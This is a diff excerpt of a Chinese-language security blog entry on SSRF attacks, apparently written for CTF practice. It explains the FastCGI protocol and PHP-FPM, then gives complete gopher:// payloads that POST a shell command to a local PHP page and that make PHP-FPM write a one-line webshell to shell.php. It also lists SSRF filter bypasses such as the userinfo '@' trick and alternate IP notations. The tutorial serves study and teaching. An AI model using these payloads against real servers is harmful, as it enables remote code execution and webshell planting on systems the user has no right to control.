+<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre>
+
+<p>得到标准格式协议：</p>
+<blockquote>
+<p>gopher%3A&#x2F;&#x2F;127.0.0.1%3A80&#x2F;_POST%2520&#x2F;post.php%2520HTTP&#x2F;1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application&#x2F;x-www-form-urlencoded%250D%250AContent-Length%253A%25208%250D%250A%250D%250Ashell%253Dls%250D%250A</p>
+</blockquote>
+<p>成功执行：</p>
+<img src="/2022/08/14/ssrf/image-20220814200618396.png" class="" loading="lazy">
+
+<h2 id="攻击FastCGI协议"><a href="#攻击FastCGI协议" class="headerlink" title="攻击FastCGI协议"></a>攻击FastCGI协议</h2><ul>
+<li><strong>FastCGI</strong>（Fast Common Gateway Interface）就是一个通信协议，相比HTTP协议，HTTP是浏览器与服务器中间件进行数据交换的协议，而FastCGI就是服务器中间件与某个语言后端进行数据交换的协议。</li>
+</ul>
+<p>HTTP协议是<strong>浏览器和服务器中间件进行数据交换的协议</strong>，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p>
+<p>类比HTTP协议来说，FastCGI协议则是<strong>服务器中间件和某个语言后端进行数据交换的协议</strong>。FastCGI协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照FastCGI的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
+<p>和HTTP头不同，Record中Header的大小固定8个字节，body的大小是由头中的contentLength指定，其结构如下：</p>
+<pre class="language-none"><code class="language-none">typedef struct &#123;
+  &#x2F;* Header *&#x2F;
+  unsigned char version; &#x2F;&#x2F; 版本
+  unsigned char type; &#x2F;&#x2F; 本次record的类型
+  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id
+  unsigned char requestIdB0;
+  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小
+  unsigned char contentLengthB0;
+  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小
+  unsigned char reserved; 
+ 
+  &#x2F;* Body *&#x2F;
+  unsigned char contentData[contentLength];
+  unsigned char paddingData[paddingLength];
+&#125; FCGI_Record;</code></pre>
+
+<p>语言端解析了FastCGI头以后，拿到<code>contentLength</code>，然后再在TCP流里读取大小等于<code>contentLength</code>的数据，这就是body体。</p>
+<p><code>requestId</code>作为同一次请求的id。</p>
+<p><code>type</code>就是指定该Record的作用。因为FastCGI一个Record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个Record。通过<code>type</code>来标志每个Record的作用，主要有以下几个类型：</p>
+<img src="/2022/08/14/ssrf/image-20220815005106290.png" class="" loading="lazy">
+
+<p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对。</p>
+<ul>
+<li><strong>PHP-FPM</strong>（PHP FastCGI Process Manager）其实是一个fastcgi协议解析器，按照FastCGI的协议将TCP流解析成真正的数据。</li>
+</ul>
+<p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p>
+<pre class="language-none"><code class="language-none">&#123;
+    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,
+    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
+    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,
+    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,
+    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,
+    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,
+    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,
+    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,
+    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
+    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,
+    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
+    &#39;SERVER_PORT&#39;: &#39;80&#39;,
+    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,
+    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;
+&#125;</code></pre>
+
+<p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。</p>
+<p>PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行<code>SCRIPT_FILENAME</code>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code>。</p>
+<img src="/2022/08/14/ssrf/image-20220814210302688.png" class="" loading="lazy">
+
+
+
+<p>PHP-FPM默认监听的端口是9000，一般情况会只会接受127.0.0.1也就是本地的请求，利用SSRF可以越权访问。</p>
+<p>利用FastCGI修改环境变量<code>auto_prepend_file = php://input</code>和<code>allow_url_include = On</code>，就会在执行php脚本之前包含<code>auto_prepend_file</code>文件的内容，<code>php://input</code>也就是POST的内容，这样我们可以在FastCGI协议的body控制为恶意代码，这样就在理论上实现了<code>php-fpm</code>任意代码执行的攻击。</p>
+<p>那么只要目标服务器上存在可访问的php文件即可RCE。</p>
+<ul>
+<li>测试</li>
+</ul>
+<p>已知存在<code>/var/html/www/index.php</code>，准备一句话木马<code>&lt;?php system($_GET[&#39;shell&#39;]);?&gt;</code>。</p>
+<p>利用**<a href="https://github.com/tarunkant/Gopherus">Gopherus工具</a>**生成payload：</p>
+<img src="/2022/08/14/ssrf/image-20220815190325204.png" class="" loading="lazy">
+
+<p>再次url编码，因为GET传值和CURL都会解码一次：</p>
+<pre class="language-none"><code class="language-none">gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH127%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%257F%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520%2522PD9waHAgc3lzdGVtKCRfR0VUWydzaGVsbCddKTs%2FPg%253D%253D%2522%2520%257C%2520base64%2520-d%2520%253E%2520shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</code></pre>
+
+<p>成功写入<code>shell.php</code>：</p>
+<img src="/2022/08/14/ssrf/image-20220815190507325.png" class="" loading="lazy">
+
+<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>一些常见的限制和绕过姿势。</p>
+<h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>
+<p>例如限制路径必须含有<code>http://www.baidu.com</code>：</p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'http://www.baidu.com'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// http://www.baidu.com@192.168.0.1</span></code></pre>
+
+<p>对上述URL的内容进行解析的时候，很可能会认为访问URL的host为<code>www.baidu.com</code>，而实际上这个URL所请求的内容为<code>192.168.0.1</code>上的内容。</p>
+<h3 id="数字IP"><a href="#数字IP" class="headerlink" title="数字IP"></a>数字IP</h3><p>一些后端对传过来的URL参数进行正则匹配来过滤掉内网IP，对于这种过滤，可以改变IP的形式来绕过。</p>
+<p>例如：十六进制、八进制、十进制、省略模式</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/articles/web/265646.html">SSRF的利用方式</a></p>
+<p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
+<p><a href="https://blog.csdn.net/shreck66/article/details/50355729">fastcgi协议分析与实例</a></p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
 </search>
